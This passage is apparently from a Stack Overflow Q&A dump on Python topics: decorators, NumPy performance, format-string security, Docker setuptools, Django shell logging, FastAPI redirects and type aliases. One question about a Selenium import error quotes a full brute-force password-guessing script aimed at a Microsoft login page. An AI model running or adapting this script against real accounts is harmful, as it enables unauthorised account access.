<blockquote>
<p>TypeError: inner_func() missing 1 required positional argument: 'name'</p>
</blockquote>
<p>or misunderstanding self class with self function.</p>
","71226219","<p>As an alternative to Stefan's answer, the following simply uses <code>@trier</code> without any parameters to decorate functions, and then when printing out the error message we can get the name with <code>func.__name__</code>.</p>
<pre><code>from functools import wraps

def trier(func):
    &quot;&quot;&quot;Decorator for trying A-class methods&quot;&quot;&quot;
    @wraps(func)
    def inner_func(self, *args, **kwargs):

        try:
            return func(self, *args, **kwargs)

        except:
            print(f&quot;An error apeared in {func.__name__}&quot;)

    return inner_func

class A:
    def __init__(self):
        self._animals = 2
        self._humans = 5

    @trier
    def animals(self, num):
        return self._animals + num

    @trier
    def humans(self):
        return self._humans

print(A().animals(1))
</code></pre>
<p>I also fixed a couple of bugs in the code: In <code>trier</code>'s try and except the result of calling <code>func</code> was never returned, and you need to include <code>**kwargs</code> in addition to <code>*args</code> so you can use named parameters. I.e. <code>A().animals(num=1)</code> only works when you handle <code>kwargs</code>.</p>
"
"71225872","1","Why does numpy.view(bool) makes numpy.logical_and significantly faster?","<p>When passing a <code>numpy.ndarray</code> of <code>uint8</code> to <code>numpy.logical_and</code>, it runs significantly faster if I apply <code>numpy.view(bool)</code> to its inputs.</p>
<pre class=""lang-py prettyprint-override""><code>a = np.random.randint(0, 255, 1000 * 1000 * 100, dtype=np.uint8)
b = np.random.randint(0, 255, 1000 * 1000 * 100, dtype=np.uint8)

%timeit np.logical_and(a, b)
126 ms ± 1.17 ms per loop (mean ± std. dev. of 7 runs, 10 loops each)

%timeit np.logical_and(a.view(bool), b.view(bool))
20.9 ms ± 110 µs per loop (mean ± std. dev. of 7 runs, 10 loops each)
</code></pre>
<p>Can someone explain why this is happening?</p>
<p>Furthermore, why <code>numpy.logical_and</code> doesn't automatically apply <code>view(bool)</code> to an array of <code>uint8</code>? (Is there any situation where we shouldn't use <code>view(bool)</code>?)</p>
<p>EDIT:</p>
<p>It seems that this is an issue with Windows environment.
I just tried the same thing in the official python docker container (which is debian) and found no difference between them.</p>
<p>My environment:</p>
<ul>
<li>OS: Windows 10 Pro 21H2</li>
<li>CPU: AMD Ryzen 9 5900X</li>
<li>Python: Python 3.10.2 (tags/v3.10.2:a58ebcc, Jan 17 2022, 14:12:15) [MSC v.1929 64 bit (AMD64)] on win32</li>
<li>numpy: 1.22.2</li>
</ul>
","71227844","<p>This is a performance issue of the current Numpy implementation. I can also reproduce this problem on Windows (using an Intel Skylake Xeon processor with Numpy 1.20.3). <code>np.logical_and(a, b)</code> executes a <strong>very-inefficient scalar assembly code</strong> based on <strong>slow conditional jumps</strong> while <code>np.logical_and(a.view(bool), b.view(bool))</code> executes relatively-fast <strong>SIMD instructions</strong>.</p>
<p>Currently, Numpy uses a <a href=""https://github.com/numpy/numpy/blob/a804f894153ab0cc1f47c4ab176aecc782583995/numpy/core/src/umath/loops.c.src#L428"" rel=""noreferrer"">specific implementation</a> for <code>bool</code>-types. Regarding the compiler used, the general-purpose implementation can be significantly slower if the compiler used to build Numpy failed to automatically vectorize the code which is apparently the case on Windows (and explain why this is not the case on other platforms since the compiler is likely not exactly the same). <em>The Numpy code can be improved for non-<code>bool</code> types</em>. Note that the vectorization of Numpy is an ongoing work and we plan optimize this soon.</p>
<hr />
<h2>Deeper analysis</h2>
<p>Here is the assembly code executed by <code>np.logical_and(a, b)</code>:</p>
<pre><code>Block 24:                         
    cmp byte ptr [r8], 0x0        ; Read a[i]
    jz &lt;Block 27&gt;                 ; Jump to block 27 if a[i]!=0
Block 25:                         
    cmp byte ptr [r9], 0x0        ; Read b[i]
    jz &lt;Block 27&gt;                 ; Jump to block 27 if b[i]!=0
Block 26:                         
    mov al, 0x1                   ; al = 1
    jmp &lt;Block 28&gt;                ; Skip the next instruction
Block 27:                         
    xor al, al                    ; al = 0
Block 28:                         
    mov byte ptr [rdx], al        ; result[i] = al
    inc r8                        ; i += 1
    inc rdx                       
    inc r9                        
    sub rcx, 0x1                  
    jnz &lt;Block 24&gt;                ; Loop again while i&lt;a.shape[0]
</code></pre>
<p>As you can see, the loop use several <em>data-dependent conditional jumps</em> to write per item of <code>a</code> and <code>b</code> read. This is very inefficient here since <strong>the branch taken cannot be <a href=""https://stackoverflow.com/questions/11227809/why-is-processing-a-sorted-array-faster-than-processing-an-unsorted-array/11227902#11227902"">predicted</a></strong> by the processor with random values. As a result the processor <em>stall for few cycles</em> (typically about 10 cycles on modern x86 processors).</p>
<p>Here is the assembly code executed by <code>np.logical_and(a.view(bool), b.view(bool))</code>:</p>
<pre><code>Block 15:
    movdqu xmm1, xmmword ptr [r10]               ; xmm1 = a[i:i+16]
    movdqu xmm0, xmmword ptr [rbx+r10*1]         ; xmm0 = b[i:i+16]
    lea r10, ptr [r10+0x10]                      ; i += 16
    pcmpeqb xmm1, xmm2                           ; \
    pandn xmm1, xmm0                             ;  | Complex sequence to just do:
    pcmpeqb xmm1, xmm2                           ;  | xmm1 &amp;= xmm0
    pandn xmm1, xmm3                             ; /
    movdqu xmmword ptr [r14+r10*1-0x10], xmm1    ; result[i:i+16] = xmm1
    sub rcx, 0x1                                 
    jnz &lt;Block 15&gt;                               ; Loop again while i!=a.shape[0]//16
</code></pre>
<p>This code use the <strong>SIMD instruction</strong> set called SSE which is able to work on 128-bit wide registers. There is no conditional jumps. This code is far more efficient as it operates on 16 items at once per iteration and each iteration should be much faster.</p>
<p>Note that this last code is not optimal either as most modern x86 processors (like your AMD one) supports the 256-bit AVX-2 instruction set (twice as fast). Moreover, the compiler generate an inefficient sequence of SIMD instruction to perform the logical-and that can be optimized. The compiler seems to assume the boolean can be values different of 0 or 1. That being said, the input arrays are too big to fit in your CPU cache and so the code is <strong>bounded by the throughput of your RAM</strong> as opposed to the first one. This is why the SIMD-friendly code is not drastically faster. The difference between the two version is certainly much bigger with arrays of less than 1 MiB on your processor (like on almost all other modern processor).</p>
"
"70751249","1","Which are safe methods and practices for string formatting with user input in Python 3?","<h1>My Understanding</h1>
<p>From various sources, I have come to the understanding that there are four main techniques of string formatting/interpolation in Python 3 (3.6+ for f-strings):</p>
<ol>
<li>Formatting with <code>%</code>, which is similar to C's <code>printf</code></li>
<li>The <code>str.format()</code> method</li>
<li>Formatted string literals/f-strings</li>
<li>Template strings from the standard library <code>string</code> module</li>
</ol>
<p>My knowledge of usage mainly comes from <a href=""https://realpython.com/python-string-formatting/"" rel=""noreferrer"">Python String Formatting Best Practices (<em>source A</em>)</a>:</p>
<ul>
<li><code>str.format()</code> was created as a better alternative to the <code>%</code>-style, so the latter is now obsolete
<ul>
<li>However, <code>str.format()</code> is <a href=""https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/"" rel=""noreferrer"" title=""Be Careful with Python's New-Style String Format"">vulnerable to attacks</a> if user-given format strings are not properly handled</li>
</ul>
</li>
<li>f-strings allow <code>str.format()</code>-like behavior only for string literals but are shorter to write and are actually somewhat-optimized syntactic sugar for concatenation</li>
<li>Template strings are safer than <code>str.format()</code> (demonstrated in the first source) and the other two methods (implied in the first source) when dealing with user input</li>
</ul>
<p>I understand that the aforementioned vulnerability in <code>str.format()</code> comes from the method being usable on any normal strings where the delimiting braces are part of the string data itself. Malicious user input containing brace-delimited replacement fields can be supplied to the method to access environment attributes. I believe this is unlike the other ways of formatting where the programmer is the only one that can supply variables to the pre-formatted string. For example, <a href=""https://docs.python.org/3/reference/lexical_analysis.html#f-strings"" rel=""noreferrer"" title=""Python Docs: f-strings"">f-strings</a> have similar syntax to <a href=""https://docs.python.org/3/library/string.html#format-string-syntax"" rel=""noreferrer"" title=""Python Docs: Format String Syntax""><code>str.format()</code></a> but, because f-strings are literals and the inserted values are evaluated separately through concatenation-like behavior, they are not vulnerable to the same attack (<a href=""https://security.stackexchange.com/questions/238338/are-there-any-security-concerns-to-using-python-f-strings-with-user-input"" title=""Are there any Security Concerns to using Python F Strings with User Input""><em>source B</em></a>). Both <code>%</code>-formatting and Template strings also seem to only be supplied variables for substitution by the programmer; the main difference pointed out is Template's more limited functionality.</p>
<h1>My Confusion</h1>
<p>I have seen a lot of emphasis on the vulnerability of <code>str.format()</code> which leaves me with questions of what I should be wary of when using the other techniques. <em>Source A</em> describes Template strings as the safest of the above methods &quot;due to their reduced complexity&quot;:</p>
<blockquote>
<p>The more complex formatting mini-languages of the other string formatting techniques might introduce security vulnerabilities to your programs.</p>
</blockquote>
<ol>
<li>Yes, it seems like f-strings are not vulnerable in the same way <code>str.format()</code> is, but are there known concerns about <strong>f-string</strong> security as is implied by <em>source A</em>? Is the concern more like risk mitigation for unknown exploits and unintended interactions?</li>
</ol>
<p>I am not familiar with C and I don't plan on using the clunkier <code>%</code>/<code>printf</code>-style formatting, but I have heard that C's <code>printf</code> had its own potential vulnerabilities. In addition, both <em>sources A and B</em> seem to imply a lack of security with this method. The top answer in Source B says,</p>
<blockquote>
<p>String formatting may be dangerous when a format string depends on untrusted data. So, when using str.format() or %-formatting, it's important to use static format strings, or to sanitize untrusted parts before applying the formatter function.</p>
</blockquote>
<ol start=""2"">
<li>Do <code>%</code>-style strings have known security concerns?</li>
<li>Lastly, which methods should be used and how can user input-based attacks be prevented (e.g. filtering input with regex)?
<ul>
<li>More specifically, are Template strings really the safer option? and Can f-strings be used just as easily and safely while granting more functionality?</li>
</ul>
</li>
</ol>
","70755916","<p>It doesn't matter which format you choose, any format and library can have its own downsides and vulnerabilities. The bigger questions you need to ask yourself is what is the risk factor and the scenario you are facing with, and what are you going to do about it.
First ask yourself: will there be a scenario where a user or an external entity of some kind (for example - an external system) sends you a format string? If the answer is no, there is no risk. If the answer is yes, you need to see whether this is needed or not. If not - remove it to eliminate the risk.
If you need it - you can perform whitelist-based input validation and exclude all format-specific special characters from the list of permitted characters, in order to eliminate the risk. For example, no format string can pass the ^[a-zA-Z0-9\s]*$ generic regular expression.</p>
<p>So the bottom line is: it doesn't matter which format string type you use, what's really important is what do you do with it and how can you reduce and eliminate the risk of it being tampered.</p>
"
"70773526","1","Why do we need a dict.update() method in python instead of just assigning the values to the corresponding keys?","<p>I have been working with dictionaries that I have to modify within different parts of my code. I am trying to make sure if I do not miss anything about there is no need for dict_update() in any scenario.</p>
<p>So the reasons to use update() method is either to add a new key-value pair to current dictionary, or update the value of your existing ones.</p>
<p>But wait!?</p>
<p>Aren't they already possible by just doing:</p>
<pre><code>&gt;&gt;&gt;test_dict = {'1':11,'2':1445}
&gt;&gt;&gt;test_dict['1'] = 645
&gt;&gt;&gt;test_dict
{'1': 645, '2': 1445}
&gt;&gt;&gt;test_dict[5]=123
&gt;&gt;&gt;test_dict
{'1': 645, '2': 1445, 5: 123}
</code></pre>
<p>In what case it would be crucial to use it ? I am curious.</p>
<p>Many thanks</p>
","70773868","<h3>1. You can update many keys on the same statement.</h3>
<pre><code>my_dict.update(other_dict)
</code></pre>
<p>In this case you don't have to know how many keys are in the <code>other_dict</code>. You'll just be sure that all of them will be updated on <code>my_dict</code>.</p>
<h3>2. You can use any iterable of key/value pairs with dict.update</h3>
<p>As per the <a href=""https://docs.python.org/3/library/stdtypes.html"" rel=""noreferrer"">documentation</a> you can use another dictionary, kwargs, list of tuples, or even generators that yield tuples of len 2.</p>
<h3>3. You can use the <code>update</code> method as an argument for functions that expect a function argument.</h3>
<p>Example:</p>
<pre><code>def update_value(key, value, update_function):
    update_function([(key, value)])

update_value(&quot;k&quot;, 3, update_on_the_db)  # suppose you have a update_on_the_db function
update_value(&quot;k&quot;, 3, my_dict.update)  # this will update on the dict
</code></pre>
"
"71238822","1","Why is setuptools not available in environment Ubuntu docker image with Python & dev tools installed?","<p>I'm trying to build a Ubuntu 18.04 Docker image running Python 3.7 for a machine learning project. When installing specific Python packages with <code>pip</code> from <code>requirements.txt</code>, I get the following error:</p>
<pre><code>Collecting sklearn==0.0
  Downloading sklearn-0.0.tar.gz (1.1 kB)
  Preparing metadata (setup.py): started
  Preparing metadata (setup.py): finished with status 'error'
  error: subprocess-exited-with-error
  
  × python setup.py egg_info did not run successfully.
  │ exit code: 1
  ╰─&gt; [1 lines of output]
      ERROR: Can not execute `setup.py` since setuptools is not available in the build environment.
      [end of output]
</code></pre>
<p>Although here the error arises in the context of <code>sklearn</code>, the issue is not specific to one library; when I remove that libraries and try to rebuild the image, the error arises with other libraries.</p>
<p>Here is my <code>Dockerfile</code>:</p>
<pre><code>FROM ubuntu:18.04

# install python
RUN apt-get update &amp;&amp; \
    apt-get install --no-install-recommends -y \
    python3.7 python3-pip python3.7-dev

# copy requirements
WORKDIR /opt/program
COPY requirements.txt requirements.txt

# install requirements
RUN python3.7 -m pip install --upgrade pip &amp;&amp; \
    python3.7 -m pip install -r requirements.txt

# set up program in image
COPY . /opt/program
</code></pre>
<p>What I've tried:</p>
<ul>
<li>installing <code>python-devtools</code>, both instead of and alongside, <code>python3.7-dev</code> before installing requirements with <code>pip</code>;</li>
<li>installing <code>setuptools</code> in <code>requirements.txt</code> before affected libraries are installed.</li>
</ul>
<p>In both cases the same error arose.</p>
<p>Do you know how I can ensure <code>setuptools</code> is available in my environment when installing libraries like <code>sklearn</code>?</p>
","71239956","<p>As mentioned in comment, install <code>setuptools</code> with <code>pip</code> before running <code>pip install -r requirements.txt</code>.</p>
<p>It is different than putting <code>setuptools</code> higher in the <code>requirements.txt</code> because it forces the order while the requirements file collect all the packages and installs them after so you don't control the order.</p>
"
"70658151","1","How to log production database changes made via the Django shell","<p>I would like to automatically generate some sort of log of all the database changes that are made via the Django shell in the production environment.</p>
<p>We use schema and data migration scripts to alter the production database and they are version controlled. Therefore if we introduce a bug, it's easy to track it back. But if a developer in the team changes the database via the Django shell which then introduces an issue, at the moment we can only hope that they remember what they did or/and we can find their commands in the Python shell history.</p>
<p>Example. Let's imagine that the following code was executed by a developer in the team via the Python shell:</p>
<pre><code>&gt;&gt;&gt; tm = TeamMembership.objects.get(person=alice)
&gt;&gt;&gt; tm.end_date = date(2022,1,1)
&gt;&gt;&gt; tm.save()
</code></pre>
<p>It changes a team membership object in the database. I would like to log this somehow.</p>
<p>I'm aware that there are a bunch of <a href=""https://djangopackages.org/grids/g/model-audit/"" rel=""nofollow noreferrer"">Django packages related to audit logging</a>, but I'm only interested in the changes that are triggered from the Django shell, and I want to log the Python code that updated the data.</p>
<p>So the questions I have in mind:</p>
<ul>
<li>I can log the statements from IPython but how do I know which one touched the database?</li>
<li>I can listen to the <code>pre_save</code> signal for all model to know if data changes, but how do I know if the source was from the Python shell? How do I know what was the original Python statement?</li>
</ul>
","70791300","<p>This solution logs all commands in the session if any database changes were made.</p>
<h1>How to detect database changes</h1>
<p>Wrap <code>execute_sql</code> of <code>SQLInsertCompiler</code>, <code>SQLUpdateCompiler</code> and <code>SQLDeleteCompiler</code>.</p>
<p><code>SQLDeleteCompiler.execute_sql</code> returns a cursor wrapper.</p>
<pre class=""lang-py prettyprint-override""><code>from django.db.models.sql.compiler import SQLInsertCompiler, SQLUpdateCompiler, SQLDeleteCompiler

changed = False

def check_changed(func):
    def _func(*args, **kwargs):
        nonlocal changed
        result = func(*args, **kwargs)
        if not changed and result:
            changed = not hasattr(result, 'cursor') or bool(result.cursor.rowcount)
        return result
    return _func

SQLInsertCompiler.execute_sql = check_changed(SQLInsertCompiler.execute_sql)
SQLUpdateCompiler.execute_sql = check_changed(SQLUpdateCompiler.execute_sql)
SQLDeleteCompiler.execute_sql = check_changed(SQLDeleteCompiler.execute_sql)
</code></pre>
<h1>How to log commands made via the Django shell</h1>
<p><code>atexit.register()</code> an exit handler that does <code>readline.write_history_file()</code>.</p>
<pre class=""lang-py prettyprint-override""><code>import atexit
import readline

def exit_handler():
    filename = 'history.py'
    readline.write_history_file(filename)

atexit.register(exit_handler)
</code></pre>
<h2>IPython</h2>
<p>Check whether IPython was used by comparing <code>HistoryAccessor.get_last_session_id()</code>.</p>
<pre class=""lang-py prettyprint-override""><code>import atexit
import io
import readline

ipython_last_session_id = None
try:
    from IPython.core.history import HistoryAccessor
except ImportError:
    pass
else:
    ha = HistoryAccessor()
    ipython_last_session_id = ha.get_last_session_id()

def exit_handler():
    filename = 'history.py'
    if ipython_last_session_id and ipython_last_session_id != ha.get_last_session_id():
        cmds = '\n'.join(cmd for _, _, cmd in ha.get_range(ha.get_last_session_id()))
        with io.open(filename, 'a', encoding='utf-8') as f:
            f.write(cmds)
            f.write('\n')
    else:
        readline.write_history_file(filename)

atexit.register(exit_handler)
</code></pre>
<h1>Put it all together</h1>
<p>Add the following in manage.py before <code>execute_from_command_line(sys.argv)</code>.</p>
<pre class=""lang-py prettyprint-override""><code>if sys.argv[1] == 'shell':
    import atexit
    import io
    import readline

    from django.db.models.sql.compiler import SQLInsertCompiler, SQLUpdateCompiler, SQLDeleteCompiler

    changed = False

    def check_changed(func):
        def _func(*args, **kwargs):
            nonlocal changed
            result = func(*args, **kwargs)
            if not changed and result:
                changed = not hasattr(result, 'cursor') or bool(result.cursor.rowcount)
            return result
        return _func

    SQLInsertCompiler.execute_sql = check_changed(SQLInsertCompiler.execute_sql)
    SQLUpdateCompiler.execute_sql = check_changed(SQLUpdateCompiler.execute_sql)
    SQLDeleteCompiler.execute_sql = check_changed(SQLDeleteCompiler.execute_sql)

    ipython_last_session_id = None
    try:
        from IPython.core.history import HistoryAccessor
    except ImportError:
        pass
    else:
        ha = HistoryAccessor()
        ipython_last_session_id = ha.get_last_session_id()

    def exit_handler():
        if changed:
            filename = 'history.py'
            if ipython_last_session_id and ipython_last_session_id != ha.get_last_session_id():
                cmds = '\n'.join(cmd for _, _, cmd in ha.get_range(ha.get_last_session_id()))
                with io.open(filename, 'a', encoding='utf-8') as f:
                    f.write(cmds)
                    f.write('\n')
            else:
                readline.write_history_file(filename)

    atexit.register(exit_handler)
</code></pre>
"
"70773879","1","fastapi (starlette) RedirectResponse redirect to post instead get method","<p>I have encountered strange redirect behaviour after returning a RedirectResponse object</p>
<p><strong>events.py</strong></p>
<pre><code>router = APIRouter()

@router.post('/create', response_model=EventBase)
async def event_create(
        request: Request,
        user_id: str = Depends(get_current_user),
        service: EventsService = Depends(),
        form: EventForm = Depends(EventForm.as_form)
):
    event = await service.post(
       ...
   )
    redirect_url = request.url_for('get_event', **{'pk': event['id']})
    return RedirectResponse(redirect_url)


@router.get('/{pk}', response_model=EventSingle)
async def get_event(
        request: Request,
        pk: int,
        service: EventsService = Depends()
):
    ....some logic....
    return templates.TemplateResponse(
        'event.html',
        context=
        {
            ...
        }
    )
</code></pre>
<p><strong>routers.py</strong></p>
<pre><code>api_router = APIRouter()

...
api_router.include_router(events.router, prefix=&quot;/event&quot;)
</code></pre>
<p>this code returns the result</p>
<pre><code>127.0.0.1:37772 - &quot;POST /event/22 HTTP/1.1&quot; 405 Method Not Allowed
</code></pre>
<p>OK, I see that for some reason a POST request is called instead of a GET request. I search for an explanation and find that the RedirectResponse object defaults to code 307 and calls POST <a href=""https://stackoverflow.com/questions/66849929/fastapi-redirect-gives-method-not-allowed-error"">link</a></p>
<p>I follow the advice and add a status</p>
<pre><code>redirect_url = request.url_for('get_event', **{'pk': event['id']}, status_code=status.HTTP_302_FOUND)
</code></pre>
<p>And get</p>
<pre><code>starlette.routing.NoMatchFound
</code></pre>
<p>for the experiment, I'm changing <code>@router.get('/{pk}', response_model=EventSingle)</code> to <code>@router.post('/{pk}', response_model=EventSingle)</code></p>
<p>and the redirect completes successfully, but the post request doesn't suit me here. What am I doing wrong?</p>
<p><strong>UPD</strong></p>
<p>html form for running <strong>event/create</strong> logic</p>
<p><strong>base.html</strong></p>
<pre><code>&lt;form action=&quot;{{ url_for('event_create')}}&quot; method=&quot;POST&quot;&gt;
...
&lt;/form&gt;
</code></pre>
<p><strong>base_view.py</strong></p>
<pre><code>@router.get('/', response_class=HTMLResponse)
async def main_page(request: Request,
                    activity_service: ActivityService = Depends()):
    activity = await activity_service.get()
    return templates.TemplateResponse('base.html', context={'request': request,
                                                            'activities': activity})
</code></pre>
","70774192","<p>When you want to redirect to a GET after a POST, the best practice is <a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/303"" rel=""noreferrer"">to redirect with a <code>303</code> status code</a>, so just update your code to:</p>
<pre><code>    # ...
    return RedirectResponse(redirect_url, status_code=303)
</code></pre>
<p>As you've noticed, <a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/307"" rel=""noreferrer"">redirecting with <code>307</code> keeps the HTTP method and body</a>.</p>
<h3>Fully working example:</h3>
<pre><code>from fastapi import FastAPI, APIRouter, Request
from fastapi.responses import RedirectResponse, HTMLResponse


router = APIRouter()

@router.get('/form')
def form():
    return HTMLResponse(&quot;&quot;&quot;
    &lt;html&gt;
    &lt;form action=&quot;/event/create&quot; method=&quot;POST&quot;&gt;
    &lt;button&gt;Send request&lt;/button&gt;
    &lt;/form&gt;
    &lt;/html&gt;
    &quot;&quot;&quot;)

@router.post('/create')
async def event_create(
        request: Request
):
    event = {&quot;id&quot;: 123}
    redirect_url = request.url_for('get_event', **{'pk': event['id']})
    return RedirectResponse(redirect_url, status_code=303)


@router.get('/{pk}')
async def get_event(
        request: Request,
        pk: int,
):
    return f'&lt;html&gt;oi pk={pk}&lt;/html&gt;'

app = FastAPI(title='Test API')

app.include_router(router, prefix=&quot;/event&quot;)
</code></pre>
<p>To run, install <code>pip install fastapi uvicorn</code> and run with:</p>
<pre><code>uvicorn --reload --host 0.0.0.0 --port 3000 example:app
</code></pre>
<p>Then, point your browser to: http://localhost:3000/event/form</p>
"
"71324949","1","Import ""selenium"" could not be resolved Pylance (reportMissingImports)","<p>I am editing a file in VS code. VS code gives the following error: <code>Import &quot;selenium&quot; could not be resolved Pylance (reportMissingImports)</code>.</p>
<p>This is the code from metachar:</p>
<pre><code># Coded and based by METACHAR/Edited and modified for Microsoft by Major
import sys
import datetime
import selenium
import requests
import time as t
from sys import stdout
from selenium import webdriver
from optparse import OptionParser
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException

# Graphics
class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   CWHITE  = '\33[37m'

# Config#
parser = OptionParser()
now = datetime.datetime.now()

# Args
parser.add_option(&quot;--passsel&quot;, dest=&quot;passsel&quot;,help=&quot;Choose the password selector&quot;)
parser.add_option(&quot;--loginsel&quot;, dest=&quot;loginsel&quot;,help= &quot;Choose the login button selector&quot;)
parser.add_option(&quot;--passlist&quot;, dest=&quot;passlist&quot;,help=&quot;Enter the password list directory&quot;)
parser.add_option(&quot;--website&quot;, dest=&quot;website&quot;,help=&quot;choose a website&quot;)
(options, args) = parser.parse_args()

CHROME_DVR_DIR = '/home/major/Hatch/chromedriver'

# Setting up Brute-Force function
def wizard():
    print (banner)
    website = raw_input(color.GREEN + color.BOLD + '\n[~] ' + color.CWHITE + 'Enter a website: ')
    sys.stdout.write(color.GREEN + '[!] '+color.CWHITE + 'Checking if site exists '),
    sys.stdout.flush()
    t.sleep(1)
    try:
        request = requests.get(website)
        if request.status_code == 200:
            print (color.GREEN + '[OK]'+color.CWHITE)
            sys.stdout.flush()
    except selenium.common.exceptions.NoSuchElementException:
        pass
    except KeyboardInterrupt:
        print (color.RED + '[!]'+color.CWHITE+ 'User used Ctrl-c to exit')
        exit()
    except:
        t.sleep(1)
        print (color.RED + '[X]'+color.CWHITE)
        t.sleep(1)
        print (color.RED + '[!]'+color.CWHITE+ ' Website could not be located make sure to use http / https')
        exit()
    password_selector = '#i0118'
    login_btn_selector = '#idSIButton9'
    pass_list = raw_input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
    brutes(password_selector,login_btn_selector,pass_list, website)

# Execute Brute-Force function
def brutes(password_selector,login_btn_selector,pass_list, website):
    f = open(pass_list, 'r')
    driver = webdriver.Chrome(CHROME_DVR_DIR)
    optionss = webdriver.ChromeOptions()
    optionss.add_argument(&quot;--disable-popup-blocking&quot;)
    optionss.add_argument(&quot;--disable-extensions&quot;)
    count = 1
    browser = webdriver.Chrome(CHROME_DVR_DIR)
    while True:
        try:
            for line in f:
                browser.get(website)
                t.sleep(1)
                Sel_pas = browser.find_element_by_css_selector(password_selector)
                enter = browser.find_element_by_css_selector(login_btn_selector) 
                Sel_pas.send_keys(line)
                t.sleep(2)
                print ('------------------------')
                print (color.GREEN + 'Tried password: '+color.RED + line + color.GREEN)
                print ('------------------------')
                temp = line 
        except KeyboardInterrupt: 
            exit()
        except selenium.common.exceptions.NoSuchElementException:
            print ('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
            print ('LAST PASS ATTEMPT BELLOW')
            print (color.GREEN + 'Password has been found: {0}'.format(temp))
            print (color.YELLOW + 'Have fun :)')
            exit()

banner = color.BOLD + color.RED +'''
  _    _       _       _
 | |  | |     | |     | |
 | |__| | __ _| |_ ___| |__ 
 |  __  |/ _` | __/ __| '_ \\
 | |  | | (_| | || (__| | | |
 |_|  |_|\__,_|\__\___|_| |_|
  {0}[{1}-{2}]--&gt; {3}V.1.0
  {4}[{5}-{6}]--&gt; {7}coded by Metachar
  {8}[{9}-{10}]--&gt;{11} brute-force tool                      '''.format(color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN)

driver = webdriver.Chrome(CHROME_DVR_DIR)
optionss = webdriver.ChromeOptions()
optionss.add_argument(&quot;--disable-popup-blocking&quot;)
optionss.add_argument(&quot;--disable-extensions&quot;)
count = 1 

if options.passsel == None:
    if options.loginsel == None:
        if options.passlist == None:
            if options.website == None:
                wizard()

password_selector = options.passsel
login_btn_selector = options.loginsel
website = options.website
pass_list = options.passlist
print (banner)
brutes(password_selector,login_btn_selector,pass_list, website)
</code></pre>
<p>I have downloaded the windows chromedriver. I don't know where I must place it on my computer. Does anyone have an idea where I must place it and how I can solve this error. When I try it in Linux, I get not an error. I placed the chromedriver in the same dir as the python file. When I do the exact same thing in windows it does not work. Can anyone help me out?</p>
","71325202","<p>PyLance looks for the &quot;selenium&quot; python package and cannot find it in the configured python installation. Since you're using VSCode, make sure you've configured the python extension properly. When you open a <code>.py</code> file in VSCode, you should see a python setting in the status bar down below on the left. Select the installation on which you've installed selenium and PyLance will find your import.</p>
"
"71491107","1","Formatting guidelines for type aliases","<p>What would be the correct way to format the name of a type alias—intended to be local to its module—according to the PEP8 style guide?</p>
<pre><code># mymodule.py
from typing import TypeAlias

mytype: TypeAlias = int

def f() -&gt; mytype:
    return mytype()

def g() -&gt; mytype:
    return mytype()
</code></pre>
<p>Should <code>mytype</code> be formatted in <code>CapWords</code> because it introduces a new type similar to creating new classes? Or, should <code>mytype</code> be formatted in all caps because it is treated similarly to a constant?</p>
<p>Is there a way to differentiate between type aliases that will remain unchanged (constant) throughout the lifetime of the program and ones that can change (similar to the <code>Final</code> annotation for constants)?</p>
<p>Also, should <code>mytype</code> be prefixed with an underscore (as in <code>_mytype</code>) to indicate that the type alias shouldn't be used outside this module?</p>
","71491175","<p><strong>The <a href=""https://peps.python.org/pep-0008/"" rel=""noreferrer"">PEP Style Guide</a> does <em>not</em> have any explicit guidance on how to format <code>TypeAlias</code>es.</strong> The guide does contain <a href=""https://peps.python.org/pep-0008/#type-variable-names"" rel=""noreferrer"">some rules on type variables</a>, but that's not quite what you're asking for.</p>
<hr />
<p>The next best resource I could find was <a href=""https://google.github.io/styleguide/pyguide.html#3196-type-aliases"" rel=""noreferrer"">Google's Python Style Guide</a>, which does happen to contain some guidance on how to name <code>TypeAlias</code>es:</p>
<blockquote>
<p><strong>3.19.6 Type Aliases</strong></p>
<p>You can declare aliases of complex types. The name of an alias should be CapWorded. If the alias is used only in this module, it should be _Private.</p>
<p>For example, if the name of the module together with the name of the type is too long:</p>
<pre class=""lang-py prettyprint-override""><code>_ShortName = module_with_long_name.TypeWithLongName
ComplexMap = Mapping[str, List[Tuple[int, int]]]
</code></pre>
<p>Other examples are complex nested types and multiple return variables from a function (as a tuple).</p>
</blockquote>
<p>Under this, the name of your type alias should be <code>MyType</code> if used across multiple modules, or <code>_MyType</code> if only used in the module that it is declared in.</p>
<hr />
<p>With all of this being said, remember that <strong>consistency with the existing codebase is what's most important</strong>. As <a href=""https://peps.python.org/pep-0008/#a-foolish-consistency-is-the-hobgoblin-of-little-minds"" rel=""noreferrer"">the PEP style guide</a> states:</p>
<blockquote>
<p>A style guide is about consistency. Consistency with this style guide is important. Consistency within a project is more important. Consistency within one module or function is the most important.</p>
</blockquote>
"
"70879159","1","Get datetime format from string python","<p>In Python there are multiple DateTime parsers which can parse a date string automatically without providing the datetime format. My problem is that I don't need to cast the datetime, I only need the datetime format.</p>
<p>Example:
From &quot;2021-01-01&quot;, I want something like &quot;%Y-%m-%d&quot; or &quot;yyyy-MM-dd&quot;.</p>
<p>My only idea was to try casting with different formats and get the successful one, but I don't want to list every possible format.</p>
<p>I'm working with pandas, so I can use methods that work either with series or the string DateTime parser.</p>
<p>Any ideas?</p>
","70879221","<p>In <code>pandas</code>, this is achieved by <code>pandas._libs.tslibs.parsing.guess_datetime_format</code></p>
<pre class=""lang-py prettyprint-override""><code>from pandas._libs.tslibs.parsing import guess_datetime_format

guess_datetime_format('2021-01-01')

# '%Y-%m-%d'
</code></pre>
<p>As there will always be an ambiguity on the day/month, you can specify the dayfirst case:</p>
<pre class=""lang-py prettyprint-override""><code>guess_datetime_format('2021-01-01', dayfirst=True)
# '%Y-%d-%m'
